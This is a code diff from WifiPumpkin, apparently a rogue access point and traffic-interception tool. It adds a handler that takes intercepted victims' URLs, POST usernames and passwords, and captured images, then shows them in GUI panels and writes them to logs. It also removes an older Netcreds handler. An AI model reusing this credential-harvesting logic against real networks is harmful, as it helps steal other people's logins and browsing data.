-    def get_netcreds_output(self,data):
-        ''' get std_ouput the thread Netcreds and add in DockArea '''
-        if self.FSettings.Settings.get_setting('accesspoint','statusAP',format=bool):
-            if hasattr(self,'dockAreaList'):
-                if self.PumpSettingsTAB.dockInfo['HTTP-Requests']['active'] and self.splitcodeURL in data:
-                    self.dockAreaList['HTTP-Requests'].writeModeData(str(data).split(self.splitcodeURL)[1])
-                if self.PumpSettingsTAB.dockInfo['HTTP-Authentication']['active'] and self.splitcodeCRED in data:
-                    self.dockAreaList['HTTP-Authentication'].writeModeData(data)
 
     def get_dns2proxy_output(self,data):
         ''' get std_ouput the thread dns2proxy and add in DockArea '''
@@ -1491,10 +1540,30 @@ class WifiPumpkin(QWidget):
     def get_PumpkinProxy_output(self,data):
         ''' get std_ouput the thread Pumpkin-Proxy and add in DockArea '''
         if self.FSettings.Settings.get_setting('accesspoint','statusAP',format=bool):
+            self.PumpkinProxyTAB.tableLogging.writeModeData(data)
+            self.LogPumpkinproxy.info(data)
+
+    def get_TCPproxy_output(self,data):
+        ''' get std_output from thread TCPproxy module and add in DockArea'''
+        if self.FSettings.Settings.get_setting('accesspoint', 'statusAP', format=bool):
             if hasattr(self,'dockAreaList'):
-                if self.PumpSettingsTAB.dockInfo['PumpkinProxy']['active']:
-                    self.dockAreaList['PumpkinProxy'].writeModeData(data)
-                    self.LogPumpkinproxy.info(data)
+                if data.keys()[0] == 'urlsCap':
+                    if self.PumpSettingsTAB.dockInfo['HTTP-Requests']['active']:
+                        self.dockAreaList['HTTP-Requests'].writeModeData(data)
+                        self.LogUrlMonitor.info('[ {0[src]} > {0[dst]} ] {1[Method]} {1[Host]}{1[Path]}'.format(
+                            data['urlsCap']['IP'], data['urlsCap']['Headers']))
+                elif data.keys()[0] == 'POSTCreds':
+                    if self.PumpSettingsTAB.dockInfo['HTTP-Authentication']['active']:
+                        self.dockAreaList['HTTP-Authentication'].writeModeData(data)
+                        self.LogCredsMonitor.info('URL: {}'.format(data['POSTCreds']['Url']))
+                        self.LogCredsMonitor.info('UserName: {}'.format(data['POSTCreds']['User']))
+                        self.LogCredsMonitor.info('UserName: {}'.format(data['POSTCreds']['Pass']))
+                        self.LogCredsMonitor.info('Packets: {}'.format(data['POSTCreds']['Destination']))
+                elif data.keys()[0] == 'image':
+                    self.ImageCapTAB.SendImageTableWidgets(data['image'])
+                else:
+                    self.PacketSnifferTAB.tableLogging.writeModeData(data)
+                    self.LogTcpproxy.info('[{}] {}'.format(data.keys()[0],data[data.keys()[0]]))
 
     def create_sys_tray(self):
         ''' configure system tray icon for quick access '''
